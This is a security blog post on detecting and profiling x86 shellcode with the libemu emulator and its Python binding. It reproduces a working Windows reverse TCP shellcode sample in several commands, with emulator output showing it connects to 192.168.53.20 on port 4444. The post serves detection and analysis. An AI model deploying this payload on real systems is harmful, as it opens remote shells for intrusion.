<!DOCTYPE html>
<html lang="en" data-theme-mode="light">
<head>
  <meta charset="utf-8">
  <meta name="author" content="Ankur Tyagi (@7h3rAm)">
  <meta name="description" content="Personal Weblog">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Manthan</title>
  <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp">
  <link rel="stylesheet" href="/static/css/base.css">
  <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
  <script src="/static/js/theme.js"></script>
  <script src="/static/js/highlight.min.js"></script>
  <script src="/static/js/hljs-bash.min.js"></script>
  <script src="/static/js/hljs-python.min.js"></script>
  <script src="/static/js/hljs-sql.min.js"></script>
  <script src="/static/js/hljs-powershell.min.js"></script>
  <script src="/static/js/hljs-line-numbers.min.js"></script>
</head>
<body>

<header>
  <div>
    <h1 class="site-title"><a href="/" style="color:inherit;text-decoration:none;">manthan</a></h1>
    <p class="meta">security research | code | writeups</p>
  </div>
</header>

<article id="top">
  <div class="post-header">
    <div style="display:flex; justify-content:space-between; align-items:flex-start;">
      <div>
        <h1 class="post-title" style="margin:0; cursor:pointer;" onclick="toggleAllSections()">x86 Emulation and Shellcode Detection</h1>
      </div>
      <div class="meta" style="text-align:right;">
        <div>06/Mar/2013</div>
        <div class="tags"><a href="/tags.html#code">code</a>, <a href="/tags.html#reversing">reversing</a></div>
      </div>
    </div>
    <nav class="post-nav" style="margin-top:0.3em;">
      <a class="nav-prev" href="/posts/20130105_geras-wuos-stack5-solutions.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">Gera's Warming Up on Stack #5 - Solutions</span></a>      <a class="nav-next" href="/posts/20130618_libnids-pynids.html"><span class="nav-title">Network Stream Reassembly and Defragmentation</span> <span class="arrow">&gt;&gt;&gt;</span></a>    </nav>
  </div>

  <div class="content">
    <h2 class="h2 collapsible" onclick="toggle(this);">Introduction</h2>
<p class="nested active"><a href="http://libemu.carnivore.it/">Libemu</a> is a C library that provides x86 architecture emulation and <a href="http://www.infosecwriters.com/hhworld/shellcode.txt">shellcode</a> detection features. It uses <a href="http://skypher.com/wiki/index.php?title=Hacking/Shellcode/GetPC">GetPC</a> heuristics to identify shellcode blobs within an input buffer.</p>
<p class="nested active"><code>GetPC</code> is a shellcode writing technique, commonly used with <a href="http://www.blackhatlibrary.net/Shellcode/Self-modifying">self-modifying</a> shellcode. Self-modification is a technique that enables a piece code to mutate itself, primarily to hide from AV/HIPS filters. A shellcode won't be loaded by a trusted loading mechanism, but would rather be injected into a target process's virtual address space. As such, during execution, it will have very limited knowledge of its execution context. Specifically, it won't be loaded at a known location and a reliable guess of its base location is unfeasible. Due to this limitation, one cannot use hardcoded <code>jmp</code>/<code>call</code> addresses in a shellcode but rather rely on some code to get the base address and then use offsets from the current base to reach specific locations inside shellcode buffer. Such a piece of code is also referred to as being <a href="http://en.wikipedia.org/wiki/Position-independent_code">Position Independent</a>.</p>
<h2 class="h2 collapsible" onclick="toggle(this);">Installation and Testing</h2>
<p class="nested active">Libemu install instructions are very well documented and a quick search would provide you good references, like <a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/">this</a> for example. Once both Libemu and it's Python binding, <a href="https://github.com/buffer/pylibemu">pylibemu</a>, are installed we can have a quick validation test:</p>
<pre class="nested active"><code class="language-python">#!/usr/bin/env python

import sys
import pylibemu

buf = &quot;&quot;
for line in sys.stdin.readlines():
  buf += line

print &quot;[+] Testing buf of fize %dB ...&quot; % (len(buf))

emu = pylibemu.Emulator()
offset = emu.shellcode_getpc_test(buf)

if offset &gt;= 0:
  print &quot;[+] IS SHELLCODE!&quot;
else:
  print &quot;[-] NOT SHELLCODE!&quot;
</code></pre>
<p class="nested active">Above program creates an <code>Emulator</code> instance and uses it to perform <code>GetPC</code> test upon input buffer. It can read raw input from stdin which in our case will be pipe'd through an <code>echo</code> command as such:</p>
<pre class="nested active"><code>$ echo -en &quot;\xff\xff\xff\xff&quot; | python emutest.py
[+] Testing buf of fize 4B ...
[-] NOT SHELLCODE!
$
$ echo -en &quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot; | python emutest.py
[+] Testing buf of fize 173B ...
[+] IS SHELLCODE!
</code></pre>
<p class="nested active">As is evident, the sample buffer that was used in a pylibemu usage example is indeed identified as shellcode through the <code>GetPC</code> test. Pylibemu provides another very useful API method, <code>test()</code>, that can profile shellcode bytes and identify Windows system calls, their parameters, return values, etc. This helps in understanding the behavior of identified shellcode:</p>
<pre class="nested active"><code>$ echo -en &quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot; | python emuprofile.py
[+] Testing buf of fize 173B ...
[+] IS SHELLCODE!
HMODULE LoadLibraryA (
  LPCTSTR = 0x02288910 =&gt;
    = &quot;ws2_32&quot;;
) =  0x71a10000;
int WSAStartup (
  WORD wVersionRequested = 2;
  LPWSADATA lpWSAData = 1244272;
) =  0x0;
SOCKET WSASocket (
  int af = 2;
  int type = 1;
  int protocol = 0;
  LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
  GROUP g = 0;
  DWORD dwFlags = 0;
) =  0x42;
int connect (
  SOCKET s = 66;
  struct sockaddr_in * name = 0x0012fe88 =&gt;
    struct = {
      short sin_family = 2;
      unsigned short sin_port = 23569 (port=4444);
      struct in_addr sin_addr = {
        unsigned long s_addr = 339060928 (host=192.168.53.20);
      };
      char sin_zero = &quot;       &quot;;
    };
  int namelen = 16;
) =  0x0;
</code></pre>
<p class="nested active">The profiling API identifies critical windows API calls above and emulates them in its x86 emulator. The return values for all system calls are recorded and dumped when requested. From the output it is evident that the shellcode under test will load the win32 socket library and then invoke socket calls to connect to host <code>192.168.53.20</code> through <code>4444/tcp</code> port. This implies that we are dealing with Windows/x86 Reverse TCP Bind shellcode.</p>
<h2 class="h2 collapsible" onclick="toggle(this);">Extended Testing and CFG Generation</h2>
<p class="nested active">Libemu allows you to test arbitrary blob of bytes and test if it depicts shellcode-like behavior. Projects like <a href="http://code.google.com/p/peepdf/">peepdf</a>, <a href="https://code.google.com/p/pyew/">pyew</a>, and <a href="https://code.google.com/p/pyew/">Malzilla</a> use Libemu for identifying, profiling and analyzing shellcode within arbitrary binary streams. Identifying shellcode in network streams is another interesting usecase and there is an <a href="https://github.com/MITRECND/chopshop/blob/master/modules/shellcode_detector.py">example</a> for you to play around.</p>
<p class="nested active">Libemu includes an interesting program, <code>sctest</code>, that can perform testing/profiling over arbitrary files. It can also generate a <a href="http://en.wikipedia.org/wiki/Control_flow_graph">CFG</a> for detected shellcode and write it to a <a href="http://en.wikipedia.org/wiki/DOT_%28graph_description_language%29">DOT</a> file which can then be rendered as an image:</p>
<pre class="nested active"><code>$ echo -en &quot;\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38&quot; &gt;shellcode.bin
$
$ sctest -Sgs 1000000 -v -G test.dot &lt;shellcode.bin
$
$ dot shellcode.dot -Tpng -o shellcode.png
</code></pre>
<p class="nested active">Here is the generated CFG image:</p>
<p class="nested active"><img alt="image" src="/static/files/posts_libemu_shellcode_detection/shellcode.png.webp" /></p>
  </div>

  <nav class="post-nav" style="margin-top:1em;">
    <a class="nav-prev" href="/posts/20130105_geras-wuos-stack5-solutions.html"><span class="arrow">&lt;&lt;&lt;</span> <span class="nav-title">Gera's Warming Up on Stack #5 - Solutions</span></a>    <a class="nav-next" href="/posts/20130618_libnids-pynids.html"><span class="nav-title">Network Stream Reassembly and Defragmentation</span> <span class="arrow">&gt;&gt;&gt;</span></a>  </nav>
</article>

<script>
document.addEventListener('DOMContentLoaded', function() {
  var content = document.querySelector('.content');
  if (content) {
    var headings = content.querySelectorAll('h2,h3,h4,h5,h6');
    headings.forEach(function(h) {
      var link = document.createElement('a');
      link.href = '#top';
      link.className = 'top-link';
      link.textContent = ' [^]';
      link.style.fontSize = '0.8em';
      link.style.color = 'var(--muted)';
      h.appendChild(link);
    });
  }
});
</script>

<footer>
  <p class="nested active">cc-by-sa-4.0</p>
</footer>

<aside class="sidebar">
  <div class="sidebar-content">
    <h4 class="h4 collapsible" onclick="toggle(this);">navigation</h4>
    <a href="/">home</a>
    <a href="/archive.html">archive</a>
    <a href="/tags.html">tags</a>
    <a href="/stats.html">stats</a>
    <hr>
    <a href="https://github.com/@7h3rAm">github</a>
    <a href="https://twitter.com/@7h3rAm">twitter</a>
    <hr>
    <h4 class="h4 collapsible" onclick="toggle(this);">toggles</h4>
    <div class="toggle-group">
      <button class="toggle-btn toggle-theme" onclick="toggleThemeMode()">◑ theme</button>
      <button class="toggle-btn toggle-density" onclick="toggleDensity()">▥ density</button>
      <button class="toggle-btn toggle-width" onclick="toggleWidth()">▱ width</button>
      <button class="toggle-btn toggle-justify" onclick="toggleJustify()">¶ justify</button>
      <button class="toggle-btn toggle-collapse" onclick="toggleAllSections()">±</button>
    </div>
  </div>
</aside>

<script>hljs.configure({ignoreUnescapedHTML: true}); hljs.highlightAll(); hljs.initLineNumbersOnLoad();</script>
</body>
</html>